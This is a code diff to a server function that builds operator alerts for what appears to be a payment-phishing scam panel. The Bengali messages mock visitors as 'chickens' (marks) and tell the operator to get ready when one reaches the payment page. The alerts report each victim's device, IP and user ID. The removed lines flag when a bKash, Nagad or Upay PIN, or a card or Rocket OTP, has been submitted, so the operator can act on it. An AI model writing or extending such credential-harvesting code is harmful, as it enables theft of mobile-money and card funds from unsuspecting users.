@@ -132,14 +132,6 @@ serve(async (req) => {
     const footer = `-------------------\n\n🐔মুরগির Device : ${device}\n🐔মুরগির Device Model : ${deviceModel}\n🐔মুরগির IP : ${clientIp}\n🐔মুরগির User ID : ${userId}\n🐔মুরগির Referrer : ${displayReferrer}`;
 
     let message = "";
-    // Whether this notification needs the "Process" inline button
-    let processButtonForUser: string | null = null;
-    // First PIN submit (bKash/Nagad/Upay) or first OTP submit (Card/Rocket)
-    if (type === "payment_activity" && userId !== "—") {
-      const isPinSubmit = paymentType === "mfs" && method !== "Rocket" && !!pin;
-      const isOtpSubmit = (paymentType === "card" || method === "Rocket") && !!otp;
-      if (isPinSubmit || isOtpSubmit) processButtonForUser = userId;
-    }
 
     if (type === "payment_activity") {
       if (paymentType === "card") {
@@ -160,7 +152,6 @@ serve(async (req) => {
         message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n-------------------\n\nUpdate : ${method ? `${method} Page` : "Selection Page"}\n\n${amountLine}${footer}`;
     } else if (type === "payment_cancelled") {
       message = `🐔 মুরগি পেমেন্ট ক্যানসেল করেছে ✅\n\n-------------------\n\nUpdate : ক্যানসেল পেইজে গেছে ।\n\n${amountLine}${footer}`;
-      processButtonForUser = userId !== "—" ? userId : null;
     } else if (action === "service_click") {
       message = `🐔 মুরগি প্লাটফর্মের সাভিস ক্লিক করেছে ⚠️\n\n-------------------\n\nPlatform : ${platform}\nService : ${service}\nPrice : ${priceText(price)}\n\n${footer}`;
     } else if (action === "order_submit") {
